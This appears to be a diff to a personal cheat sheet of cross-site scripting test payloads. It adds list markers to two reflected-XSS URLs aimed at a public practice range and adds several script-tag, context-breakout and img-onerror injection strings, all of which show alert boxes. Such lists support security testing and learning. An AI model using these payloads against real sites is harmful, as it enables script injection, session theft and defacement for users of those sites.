@@ -6,10 +6,17 @@ user-agent.me
 
 [Reflected XSS]
 
-http://public-firing-range.appspot.com/reflected/parameter/title?q=%3C/title%3E%3Csvg%20onload=alert%28%222%22%29%3E
+- http://public-firing-range.appspot.com/reflected/parameter/title?q=%3C/title%3E%3Csvg%20onload=alert%28%222%22%29%3E
 
-http://public-firing-range.appspot.com/reflected/parameter/title?q=<script>alert("Hacked")</script>
+- http://public-firing-range.appspot.com/reflected/parameter/title?q=<script>alert("Hacked")</script>
 
+- "></style></script><script>alert('Vulnerable')</script>"
+
+- "></style></script><script>alert('document.cookie')</script>"
+
+- !@#$<XSSTEST>[]()'"
+
+- <img src='x:x' onerror=alert(42)>
 
 [STORED XSS]
 
